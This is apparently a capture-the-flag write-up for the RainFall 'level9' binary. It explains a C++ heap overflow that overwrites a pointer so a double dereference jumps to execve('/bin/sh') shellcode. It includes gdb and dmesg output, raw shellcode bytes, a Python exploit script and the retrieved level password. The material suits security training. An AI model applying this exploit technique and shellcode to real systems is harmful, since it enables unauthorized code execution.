You can see that the binary is holding weird symbol names.

It's probably because the original code was written in `cpp`.
The function `_Znwj` is known to be the cpp `new` operator.

The other function, I don't know if they're internal `cpp` function, or
user made one. They'll be present in my reverse to understand what they do.

The idea here is to execute a shell code stored on the heap allocation in `ptr`.

By making an overflow on the `ptr` allocation, we can write the address of our shell
code in the `ptr2` pointer, and it'll be executed by this line of code:
`return (**ptr2(ptr2, ptr));`.

1. Get the `ptr`, and `ptr2` pointers.
```sh
level9@RainFall:~$ gdb --args ./level9 AAAA
(gdb) b *main + 159
Breakpoint 1 at 0x8048693
(gdb) x/x $esp+0x14 # ptr
0xbffff724:     0x0804a008
(gdb) x/x $esp+0x10 # ptr2
0xbffff720:     0x0804a078
```

2. Find and use a shell code:

I found the [shell-storm - shellcode 841](https://shell-storm.org/shellcode/files/shellcode-841.html),
which give us directly a premade shellcode to `execve` the `sh` binary.

There it's:
`\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80`

3. Get the offset of the pointer we need to change:

Send the following string: `Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6A`

And with `dmesg`:
```
[19144.949226] level9[3923]: segfault at 41366441 ip 08048682 sp bffff6c0 error 4 in level9[8048000+1000]
```

So it had segfault has: `A6dA` => `Ad6A` (from the 108th byte). But because we execute a double dereference,
we need to set another address at this position.

4. Use the heap buffer overflow to change the ptr2 pointed address to our shellcode.

The other bytes had to be filled with padding `\x90` (`NOP` code), to avoid any execution.

To avoid conflicts and execution, we need to first set our shellcode.
Then, padding of `NOP` code.
And then the pointer to that shellcode (if we set it earlier, it could be interpreted as code).
And finally, the pointer that points to our shell code pointer. Which is ptr2 - 4.
```py
shellcode = "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f" \
"\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd" \
"\x80"

shellcode_address = "\x08\xa0\x04\x08"
addr_of_shellcode_addr = "\x74\xa0\x04\x08"

print(shellcode + \
	(104 - len(shellcode)) * "\x90" + \
		shellcode_address + \
			addr_of_shellcode_addr)
```

We put it into a file in `/tmp/exploit.py`, and here we go:
```sh
level9@RainFall:~$ ./level9 "$(python /tmp/exploit.py)"
$ cd ../bonus0
$ cat .pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```